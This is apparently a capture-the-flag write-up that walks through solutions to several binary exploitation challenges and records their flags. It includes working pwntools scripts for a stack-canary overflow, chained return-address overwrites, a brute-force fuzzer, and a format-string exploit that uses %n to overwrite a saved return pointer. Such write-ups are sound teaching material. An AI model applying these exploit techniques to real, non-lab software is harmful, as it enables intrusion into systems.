## be01

The flag was stored inside the binary and could be retrieved with strings

`strings be01 | grep Flag`
flag: `sTriNGS-r-EZ-7819`

## be02

the provided source code printed out the flag when executed

`gcc be02.c; ./a.out`

flag: `c0mpILE-tIME_1822`

## bm01

the flag checks if one character in your input is b and if it is it will give you the flag

`python -c "print('b' * 79)" | nc ggcs-bm01.allyourbases.co 8134`

flag: `c0MinG-Up_bs-8788`


## bh02

simple constant stack canary.  The canary was `:)` and the loop terminated if the byte after it was `f`

```python
from pwn import *

context.terminal = ['termite', '-e']


# p = process('./bh02')
# p = gdb.debug("./bh02")
p = remote('ggcs-bh02.allyourbases.co', 8133)


buf_length = 0x50

payload = b'f' * 0x32 + b':)f'

print(p.recvuntil(":"))

p.sendline(payload)

p.interactive()
```

flag: `caNaRY-CoalMINE-2811`

## bh03

we don't have a binary for this one. The server it tells us to connect to gives us three functions to return to and then tells us the return pointer before exiting.  I used cyclic to determine that the correct offset was 45 and then wrote a python script to read the addresses in and overwrite the return pointers correctly.  After successfully returning to all three functions it gives us this text. 

```python
from pwn import *

p = remote("ggcs-bh03.allyourbases.co", 1337)

print(p.recvuntil(": "))
three = int(p.recvuntil("\n"),16)
print("function three: ", hex(three))

print(p.recvuntil(": "))
two = int(p.recvuntil("\n"),16)
print("function two: ", hex(two))

print(p.recvuntil(": "))
one = int(p.recvuntil("\n"),16)
print("function one: ", hex(one))

print(p.recvuntil("you?"))

payload = cyclic(49-4) + p32(three) + p32(two) + p32(one) + p32(three)

p.sendline(payload)

p.interactive()
```

`RmxhZzogUmV
UVE9mdW5jVGl
PTi0xOTkw`

I tried rot13 once and then stuck it into cyberchef and played around with it.  It ended up being base64


flag: `ReTTOfuncTiON-1990`

## bx01

what the fuck

`111111111111111111111111111%n`
made it print out
`Object validated, contents is 'Right now I would be number 1'`

???


```python
import itertools
import string
from multiprocessing import Pool
from pwn import *
import tqdm

def check(i):
    p = remote('ggcs-bx01.allyourbases.co', 9171)
    p.recvuntil("> ")
    p.sendline(''.join(i))
    res = p.recvline()
    if b'Invalid' not in res:
        print("with: ", i)
        print("result: ", res)


tasks = list(itertools.combinations(string.printable,2))

pool = Pool(processes=8)
for _ in tqdm.tqdm(pool.imap_unordered(check, tasks), total=len(tasks)):
    pass
```

i used this script to check every printable 2 char combination to find vulnerabilities.

flag: `tRUNkated-EveRYTHinG-6761`


## bm03

this exploit centered around a printf vulnerability which could be found in the transaction dialog.  After a valid transaction it would print out the user name directly through through printf and as such was vulnerable to a string format exploit.  

My exploit was in two parts - one to leak the stack address and program base and one to take advantage of the %n string formatter to write the address of the read_flag function to the saved return pointer. 

my first payload was `%x.%364$x` which leaked the address of a variable on the stack and a pointer to something in the program code.  I determined the offsets from the base and used these values to find the location of EBP in the account menu function and the program base.  

I then used a payload like `%{address of read_flag}x%333$hn` to overwrite the return pointer.  the 333rd "argument" pointer to the first four bytes of the reference argument so I sent the address of the return pointer as the reference argument.  The goal was to pad out the left with a bunch of spaces matching the address of read_flag.  This value would then be written to the return pointer, allowing me to read the flag.  

Once the return pointer was overwritten I just had to return and it would load read_flag.  

The server wasn't running aslr so my address leaking exploit ended up being useless.  Good thing because the server was slow and I couldn't manage to leak address and then get the flag in the same session.  

```python
from pwn import *

context.terminal = ['termite', '-e']

account_id_counter = 0

def recv_input():
	x = p.recvuntil(":>")
	# print(x)

p = process('./bm03', env = {"TERM": "xterm-256color", "SHELL": "/usr/bin/zsh"})
# p = remote('bm03.allyourbases.co', 9010)
# p = gdb.debug('./bm03', env = {"TERM": "xterm-256color", "SHELL": "/usr/bin/zsh"})

e = ELF('./bm03')

recv_input()
p.sendline('2')
recv_input()

# creating user to leak esp

p.sendline('%x.%{}$x'.format(91*4)) # 91*4 is stack offset to something in program memory 
recv_input()
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()


# log in
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

# create account 1

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

# create account 2

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

p.sendline('a')

# make transaction

p.sendline('2')
recv_input()

p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline('1')
recv_input()

p.sendline('1')
p.recvuntil('\'')
addrs = p.recvuntil('\'')[:-1]
addrs = [int(x,16) for x in addrs.split(b'.') if x not in b'']

p.sendline("")
recv_input()


p.sendline("")
p.sendline("0")
recv_input()
p.sendline("31337")
recv_input()


ebp = addrs[0] + 0x1b4
# ebp = 0xffffdb18
program_base = addrs[1] - 0xb203
# program_base = 0x56555000
saved_eip = ebp + 4
read_flag = program_base + e.symbols['_Z9read_flagv']
# print([hex(x) for x in addrs])
print("ebp: ", hex(ebp) )
print("program_base: ", hex(program_base))
print("read_flag: ", hex(read_flag & 0xfff))

# writing time

p.sendline('2')
recv_input()

# creating user to leak esp

base = '%{}$hn'.format(333)

pad = "%{}x".format((read_flag & 0xffff) - 0x15)
p.sendline(pad + base)
recv_input()
p.sendline('1')
recv_input()
p.sendline('2')
recv_input()
p.sendline('2')
recv_input()


# log in
p.sendline('1')
recv_input()
p.sendline('2')
recv_input()
p.sendline('2')
recv_input()

# create account 1

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

# create account 2

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

p.sendline('a')

# make transaction

p.sendline('2')
recv_input()

p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline('0')
recv_input()
p.sendline(p32(saved_eip) * 49)
recv_input()
p.sendline('')
recv_input()

p.sendline('0')

print(p.recvall())
```

flag: `FormattingMatters`